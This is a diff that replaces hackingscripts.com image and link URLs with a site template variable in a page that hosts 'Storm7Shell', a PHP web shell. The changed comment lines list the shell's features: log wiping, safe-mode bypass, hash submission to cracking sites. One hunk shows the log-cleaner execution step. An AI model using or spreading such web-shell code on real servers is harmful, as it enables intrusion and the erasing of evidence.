@@ -25,7 +25,7 @@ By sToRm, a 15 year old hacker (apparently).
 *
 *  VERSION 2 B*TCH!!!!
 *
-*  By sToRm - the 15-year-old hacker <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" />
+*  By sToRm - the 15-year-old hacker <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" />
 *
 *  Greetz to all my friends in #lobby
 *
@@ -60,7 +60,7 @@ By sToRm, a 15 year old hacker (apparently).
 *  made the dir listing easier to read with the alternating bgcolors
 *  little optimizations in code here and there (i'm an optimization whore tbh)
 *  submit md5/sha1 hash to cracking sites
-*  made that awesome logo <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_wink.gif" alt=";)" class="wp-smiley" />
+*  made that awesome logo <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_wink.gif" alt=";)" class="wp-smiley" />
 *  added the disabled php functions thing (took from r57shell)
 *  added better windows/*nix-specific aliases
 *  cleaned up the safe-mode bypass functions (wow, some of the shittiest code i've ever seen o_O )
@@ -7016,7 +7016,7 @@ else
 // the wipe logs stuff needs to be before cmd, because it will change the $act if the write is successful
 if ($act == 'miglc' || $act == 'zap2') { // *nix cleaners
 	if (is_writable('.')) {
-		cf($act, $$act); // 'tis pure innovation of optimization <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" />
+		cf($act, $$act); // 'tis pure innovation of optimization <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" />
 		$cmd = './'.$act; // keep this before $act = 'cmd';
 		$act = 'cmd';
 		$cmd_txt = '1';
@@ -8364,6 +8364,6 @@ if(isset($_GET['directory'])) {
 
 ## Storm7Shell script screenshot<figure id="attachment_406" style="width: 604px;" class="wp-caption aligncenter">
 
-[<img src="http://hackingscripts.com/wp/wp-content/uploads/2014/02/locus7shell_storm-1024x612.png" alt="Storm7Shell script screenshot" width="604" height="360" class="size-large wp-image-406" />][1]<figcaption class="wp-caption-text">Storm7Shell script screenshot</figcaption></figure>
+[<img src="{{ site.baseurl }}/wp-content/uploads/2014/02/locus7shell_storm-1024x612.png" alt="Storm7Shell script screenshot" width="604" height="360" class="size-large wp-image-406" />][1]<figcaption class="wp-caption-text">Storm7Shell script screenshot</figcaption></figure>
 
- [1]: http://hackingscripts.com/wp/wp-content/uploads/2014/02/locus7shell_storm.png
+ [1]: {{ site.baseurl }}/wp-content/uploads/2014/02/locus7shell_storm.png
